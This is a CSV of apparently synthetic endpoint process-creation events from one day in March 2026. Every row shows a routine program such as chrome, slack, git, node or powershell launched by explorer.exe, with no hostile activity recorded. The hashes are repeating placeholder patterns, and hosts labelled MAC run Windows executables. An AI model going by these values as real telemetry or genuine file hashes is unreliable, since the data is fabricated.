UtcTime,Computer,User,EventID,Image,CommandLine,ParentImage,DestinationIp,DestinationPort,Hashes
2026-03-15 08:16:04.207,BLD-RUN-02,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0005d5abd75a705e0005d5abd75a705e0005d5abd75a705e0005d5abd75a705e
2026-03-15 08:26:59.666,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000cff2c4434b638000cff2c4434b638000cff2c4434b638000cff2c4434b638
2026-03-15 08:37:42.141,BLD-RUN-02,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000b5aad059b7ed8000b5aad059b7ed8000b5aad059b7ed8000b5aad059b7ed8
2026-03-15 08:49:50.290,BLD-RUN-02,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0017e9817e205fd00017e9817e205fd00017e9817e205fd00017e9817e205fd0
2026-03-15 08:59:32.286,BLD-RUN-02,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001c309c109e81af001c309c109e81af001c309c109e81af001c309c109e81af
2026-03-15 09:09:28.361,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00014840d4e9b9ee00014840d4e9b9ee00014840d4e9b9ee00014840d4e9b9ee
2026-03-15 09:24:16.402,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=0000d315c4cb37930000d315c4cb37930000d315c4cb37930000d315c4cb3793
2026-03-15 09:30:31.954,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000755025d82c5d9000755025d82c5d9000755025d82c5d9000755025d82c5d9
2026-03-15 09:43:23.062,FIN-WS22,l.chen,1,node,"node",explorer.exe,,,SHA256=000f3b3a8896499e000f3b3a8896499e000f3b3a8896499e000f3b3a8896499e
2026-03-15 09:49:27.869,FIN-WS31,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000dc6de398337a6000dc6de398337a6000dc6de398337a6000dc6de398337a6
2026-03-15 09:54:09.736,MAC-DEV-17,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00030924141f84cf00030924141f84cf00030924141f84cf00030924141f84cf
2026-03-15 10:06:58.529,MAC-DEV-04,a.velasquez,1,node,"node",explorer.exe,,,SHA256=000399809e4a60f7000399809e4a60f7000399809e4a60f7000399809e4a60f7
2026-03-15 10:14:07.134,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017c400ec5064da0017c400ec5064da0017c400ec5064da0017c400ec5064da
2026-03-15 10:17:31.549,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=000c8df21a11ae24000c8df21a11ae24000c8df21a11ae24000c8df21a11ae24
2026-03-15 10:22:55.618,FIN-WS31,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00129d7010b4b88600129d7010b4b88600129d7010b4b88600129d7010b4b886
2026-03-15 10:35:17.662,FIN-WS31,t.owens,1,node,"node",explorer.exe,,,SHA256=0017439672abb7f50017439672abb7f50017439672abb7f50017439672abb7f5
2026-03-15 10:47:58.827,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0000dab21c8968380000dab21c8968380000dab21c8968380000dab21c896838
2026-03-15 10:52:52.228,MAC-DEV-04,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001506bff299435c001506bff299435c001506bff299435c001506bff299435c
2026-03-15 10:56:24.284,FIN-WS31,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0016f861443b19640016f861443b19640016f861443b19640016f861443b1964
2026-03-15 11:06:02.384,FIN-WS22,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001975cab29749d3001975cab29749d3001975cab29749d3001975cab29749d3
2026-03-15 11:13:58.289,MAC-DEV-04,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001027fee5ae9de7001027fee5ae9de7001027fee5ae9de7001027fee5ae9de7
2026-03-15 11:23:14.854,FIN-WS31,r.kapoor,1,git,"git",explorer.exe,,,SHA256=000b607c4885204c000b607c4885204c000b607c4885204c000b607c4885204c
2026-03-15 11:26:26.691,BLD-RUN-02,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00124ec094ff64a400124ec094ff64a400124ec094ff64a400124ec094ff64a4
2026-03-15 11:29:57.233,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0011230615a357cb0011230615a357cb0011230615a357cb0011230615a357cb
2026-03-15 11:42:27.870,BLD-RUN-02,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008dc1fc97988dd0008dc1fc97988dd0008dc1fc97988dd0008dc1fc97988dd
2026-03-15 11:48:56.939,FIN-WS22,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0010fe46ba57d2280010fe46ba57d2280010fe46ba57d2280010fe46ba57d228
2026-03-15 11:56:43.233,FIN-WS31,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000d850f7f8f381b000d850f7f8f381b000d850f7f8f381b000d850f7f8f381b
2026-03-15 12:03:05.755,MAC-DEV-17,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0010bbe6ed120e920010bbe6ed120e920010bbe6ed120e920010bbe6ed120e92
2026-03-15 12:15:57.460,MAC-DEV-17,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000254c3f84a0297000254c3f84a0297000254c3f84a0297000254c3f84a0297
2026-03-15 12:20:42.729,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008974f068ab4bb0008974f068ab4bb0008974f068ab4bb0008974f068ab4bb
2026-03-15 12:34:49.378,MAC-DEV-04,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001318af541ed893001318af541ed893001318af541ed893001318af541ed893
2026-03-15 12:38:12.828,FIN-WS31,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001d69b734af32e1001d69b734af32e1001d69b734af32e1001d69b734af32e1
2026-03-15 12:42:48.481,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007a80ad06407010007a80ad06407010007a80ad06407010007a80ad0640701
2026-03-15 12:48:32.049,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0005534d1c18aa0b0005534d1c18aa0b0005534d1c18aa0b0005534d1c18aa0b
2026-03-15 13:01:05.435,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000afbd60ec2085c000afbd60ec2085c000afbd60ec2085c000afbd60ec2085c
2026-03-15 13:10:30.258,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000c30c93e6bb535000c30c93e6bb535000c30c93e6bb535000c30c93e6bb535
2026-03-15 13:19:01.224,FIN-WS31,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0012893a3d0782b10012893a3d0782b10012893a3d0782b10012893a3d0782b1
2026-03-15 13:33:39.750,FIN-WS22,n.byrd,1,git,"git",explorer.exe,,,SHA256=000ce183f947a33d000ce183f947a33d000ce183f947a33d000ce183f947a33d
2026-03-15 13:46:52.627,BLD-RUN-02,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0003d5c72c3ee21f0003d5c72c3ee21f0003d5c72c3ee21f0003d5c72c3ee21f
2026-03-15 13:59:09.062,MAC-DEV-17,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001d5f6a7713d0d4001d5f6a7713d0d4001d5f6a7713d0d4001d5f6a7713d0d4
2026-03-15 14:03:25.202,MAC-DEV-17,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000b7c5ecebab75a000b7c5ecebab75a000b7c5ecebab75a000b7c5ecebab75a
2026-03-15 14:11:16.695,BLD-RUN-02,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001ce74f94c6bebb001ce74f94c6bebb001ce74f94c6bebb001ce74f94c6bebb
2026-03-15 14:25:12.661,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001bb50b1ba7ebf5001bb50b1ba7ebf5001bb50b1ba7ebf5001bb50b1ba7ebf5
2026-03-15 14:39:16.899,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0019f782c3d69a120019f782c3d69a120019f782c3d69a120019f782c3d69a12
2026-03-15 14:43:47.233,MAC-DEV-17,t.owens,1,git,"git",explorer.exe,,,SHA256=00104b88c1140a7e00104b88c1140a7e00104b88c1140a7e00104b88c1140a7e
2026-03-15 14:54:38.235,BLD-RUN-02,t.owens,1,node,"node",explorer.exe,,,SHA256=0009bf824b9cff920009bf824b9cff920009bf824b9cff920009bf824b9cff92
2026-03-15 15:03:02.977,FIN-WS22,t.owens,1,git,"git",explorer.exe,,,SHA256=00184ccb2760d6b600184ccb2760d6b600184ccb2760d6b600184ccb2760d6b6
2026-03-15 15:16:14.064,FIN-WS31,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0005aab02aec1fd40005aab02aec1fd40005aab02aec1fd40005aab02aec1fd4
2026-03-15 15:19:46.911,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=000ad38fd0775264000ad38fd0775264000ad38fd0775264000ad38fd0775264
2026-03-15 15:30:41.094,FIN-WS31,t.owens,1,git,"git",explorer.exe,,,SHA256=00152418d81de21f00152418d81de21f00152418d81de21f00152418d81de21f
2026-03-15 15:34:34.879,BLD-RUN-02,t.owens,1,git,"git",explorer.exe,,,SHA256=000776ba39ea9d95000776ba39ea9d95000776ba39ea9d95000776ba39ea9d95
2026-03-15 15:47:16.507,MAC-DEV-04,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0017537c0f3084550017537c0f3084550017537c0f3084550017537c0f308455
2026-03-15 15:52:44.179,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0007161dc9fbf54b0007161dc9fbf54b0007161dc9fbf54b0007161dc9fbf54b
2026-03-15 16:00:24.614,FIN-WS31,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0016a4b2d77351ec0016a4b2d77351ec0016a4b2d77351ec0016a4b2d77351ec
2026-03-15 16:09:16.709,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001874e7746cf9eb001874e7746cf9eb001874e7746cf9eb001874e7746cf9eb
2026-03-15 16:21:09.285,FIN-WS31,l.chen,1,git,"git",explorer.exe,,,SHA256=000eae1d4e4bb126000eae1d4e4bb126000eae1d4e4bb126000eae1d4e4bb126
2026-03-15 16:24:38.666,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=001d5c7e104e6ee0001d5c7e104e6ee0001d5c7e104e6ee0001d5c7e104e6ee0
2026-03-15 16:28:27.290,MAC-DEV-04,m.sato,1,node,"node",explorer.exe,,,SHA256=0017a8123660c4d70017a8123660c4d70017a8123660c4d70017a8123660c4d7
2026-03-15 16:42:39.280,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=001fbfbb24f35f52001fbfbb24f35f52001fbfbb24f35f52001fbfbb24f35f52
2026-03-15 16:55:08.916,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=001bdd2bb93c8a7a001bdd2bb93c8a7a001bdd2bb93c8a7a001bdd2bb93c8a7a
2026-03-15 17:08:55.505,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=000dd6f2da190feb000dd6f2da190feb000dd6f2da190feb000dd6f2da190feb
2026-03-15 17:13:44.543,FIN-WS22,e.park,1,node,"node",explorer.exe,,,SHA256=000790a3e32d7f73000790a3e32d7f73000790a3e32d7f73000790a3e32d7f73
2026-03-15 17:19:55.740,MAC-DEV-04,t.owens,1,git,"git",explorer.exe,,,SHA256=001537c9e4c9f3f4001537c9e4c9f3f4001537c9e4c9f3f4001537c9e4c9f3f4
2026-03-15 17:34:28.048,BLD-RUN-02,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0009128484e6c5a10009128484e6c5a10009128484e6c5a10009128484e6c5a1
2026-03-15 17:39:47.285,FIN-WS22,t.owens,1,git,"git",explorer.exe,,,SHA256=00174b85e7fa0c4f00174b85e7fa0c4f00174b85e7fa0c4f00174b85e7fa0c4f
2026-03-15 17:44:08.645,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=00184054f7b046b100184054f7b046b100184054f7b046b100184054f7b046b1
2026-03-15 17:49:03.048,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001ee9f588433924001ee9f588433924001ee9f588433924001ee9f588433924
2026-03-15 17:52:10.891,BLD-RUN-02,n.byrd,1,node,"node",explorer.exe,,,SHA256=0008e3d0e062c6d40008e3d0e062c6d40008e3d0e062c6d40008e3d0e062c6d4
2026-03-15 17:55:16.862,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=0006e3c6a41c2b330006e3c6a41c2b330006e3c6a41c2b330006e3c6a41c2b33
2026-03-15 18:01:26.772,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=000772f9b04f02c1000772f9b04f02c1000772f9b04f02c1000772f9b04f02c1
2026-03-15 18:05:47.275,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=0003349612e8582c0003349612e8582c0003349612e8582c0003349612e8582c
2026-03-15 18:09:02.854,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=000eed59f6502a32000eed59f6502a32000eed59f6502a32000eed59f6502a32
2026-03-15 18:17:20.682,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000dd126bde6ad7b000dd126bde6ad7b000dd126bde6ad7b000dd126bde6ad7b
2026-03-15 18:22:08.079,MAC-DEV-17,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0013269618d517350013269618d517350013269618d517350013269618d51735
2026-03-15 18:27:49.884,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001e6d487b164768001e6d487b164768001e6d487b164768001e6d487b164768
2026-03-15 18:33:52.810,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000ad68140c2dc09000ad68140c2dc09000ad68140c2dc09000ad68140c2dc09
2026-03-15 18:40:27.327,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=000206091c773e7c000206091c773e7c000206091c773e7c000206091c773e7c
2026-03-15 18:46:45.767,FIN-WS31,l.chen,1,node,"node",explorer.exe,,,SHA256=002171f74f067466002171f74f067466002171f74f067466002171f74f067466
2026-03-15 19:01:07.206,FIN-WS31,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00095e04de8f3b9200095e04de8f3b9200095e04de8f3b9200095e04de8f3b92
2026-03-15 19:06:21.440,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00120636393ae45800120636393ae45800120636393ae45800120636393ae458
2026-03-15 19:20:40.958,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001a62e3b33702ef001a62e3b33702ef001a62e3b33702ef001a62e3b33702ef
2026-03-15 19:25:55.064,FIN-WS22,e.park,1,git,"git",explorer.exe,,,SHA256=000f4b58eb73a61a000f4b58eb73a61a000f4b58eb73a61a000f4b58eb73a61a
2026-03-15 19:31:50.280,BLD-RUN-02,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00088e7655b8195d00088e7655b8195d00088e7655b8195d00088e7655b8195d
2026-03-15 19:45:24.091,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001b5348c90b4994001b5348c90b4994001b5348c90b4994001b5348c90b4994
2026-03-15 19:53:14.355,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0000dff3badf1a250000dff3badf1a250000dff3badf1a250000dff3badf1a25
2026-03-15 19:58:03.066,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001c591814266365001c591814266365001c591814266365001c591814266365
2026-03-15 20:11:47.256,MAC-DEV-17,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00202e36e15fdb4800202e36e15fdb4800202e36e15fdb4800202e36e15fdb48
2026-03-15 20:15:31.578,BLD-RUN-02,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001515c7f88caea8001515c7f88caea8001515c7f88caea8001515c7f88caea8
2026-03-15 20:18:51.229,FIN-WS31,t.owens,1,git,"git",explorer.exe,,,SHA256=000e791a40e3257b000e791a40e3257b000e791a40e3257b000e791a40e3257b
2026-03-15 20:33:41.365,MAC-DEV-04,l.chen,1,git,"git",explorer.exe,,,SHA256=0008335b096b63ce0008335b096b63ce0008335b096b63ce0008335b096b63ce
2026-03-15 20:47:05.542,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0004f720bc1b1faa0004f720bc1b1faa0004f720bc1b1faa0004f720bc1b1faa
2026-03-15 20:56:47.376,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=000aa8c579609041000aa8c579609041000aa8c579609041000aa8c579609041
2026-03-15 21:03:32.498,BLD-RUN-02,m.sato,1,node,"node",explorer.exe,,,SHA256=00165b6efa2baa0e00165b6efa2baa0e00165b6efa2baa0e00165b6efa2baa0e
2026-03-15 21:15:47.410,FIN-WS31,m.sato,1,node,"node",explorer.exe,,,SHA256=0012c49100cf7db50012c49100cf7db50012c49100cf7db50012c49100cf7db5
2026-03-15 21:30:25.883,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=001da7cd59985314001da7cd59985314001da7cd59985314001da7cd59985314
2026-03-15 21:45:14.635,BLD-RUN-02,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00174d9343fa454a00174d9343fa454a00174d9343fa454a00174d9343fa454a
2026-03-15 21:56:36.220,MAC-DEV-17,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0010726fd23a60b10010726fd23a60b10010726fd23a60b10010726fd23a60b1
2026-03-15 22:05:15.535,FIN-WS22,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0006761e7ae351f20006761e7ae351f20006761e7ae351f20006761e7ae351f2
2026-03-15 22:11:15.564,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00125c8530e62ad800125c8530e62ad800125c8530e62ad800125c8530e62ad8
2026-03-15 22:24:01.456,FIN-WS31,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0010ca3f8c5426b50010ca3f8c5426b50010ca3f8c5426b50010ca3f8c5426b5
2026-03-15 22:31:55.861,MAC-DEV-04,l.chen,1,git,"git",explorer.exe,,,SHA256=000bf9167810c81e000bf9167810c81e000bf9167810c81e000bf9167810c81e
2026-03-15 22:43:53.598,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001db65cdec008c1001db65cdec008c1001db65cdec008c1001db65cdec008c1
2026-03-15 22:56:42.923,MAC-DEV-04,m.sato,1,node,"node",explorer.exe,,,SHA256=000a9d571b5463e2000a9d571b5463e2000a9d571b5463e2000a9d571b5463e2
2026-03-15 23:02:27.872,FIN-WS31,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001cbd55db70827b001cbd55db70827b001cbd55db70827b001cbd55db70827b
2026-03-15 23:13:56.594,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000cb4a1d0788d6a000cb4a1d0788d6a000cb4a1d0788d6a000cb4a1d0788d6a
2026-03-15 23:22:16.153,BLD-RUN-02,n.byrd,1,node,"node",explorer.exe,,,SHA256=001fcfad2f81e3dc001fcfad2f81e3dc001fcfad2f81e3dc001fcfad2f81e3dc
2026-03-15 23:26:10.352,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000cf3801ec0f9d0000cf3801ec0f9d0000cf3801ec0f9d0000cf3801ec0f9d0
2026-03-15 23:33:52.954,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017dbee3d1e3de40017dbee3d1e3de40017dbee3d1e3de40017dbee3d1e3de4
2026-03-15 23:37:44.313,FIN-WS22,r.kapoor,1,git,"git",explorer.exe,,,SHA256=0013cbc681fa9ebe0013cbc681fa9ebe0013cbc681fa9ebe0013cbc681fa9ebe
2026-03-15 23:47:20.112,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000a45741f8fa9e8000a45741f8fa9e8000a45741f8fa9e8000a45741f8fa9e8
2026-03-15 23:56:37.993,BLD-RUN-02,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000f9c5559874a40000f9c5559874a40000f9c5559874a40000f9c5559874a40
2026-03-15 23:59:55.505,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000c882b95c84b09000c882b95c84b09000c882b95c84b09000c882b95c84b09
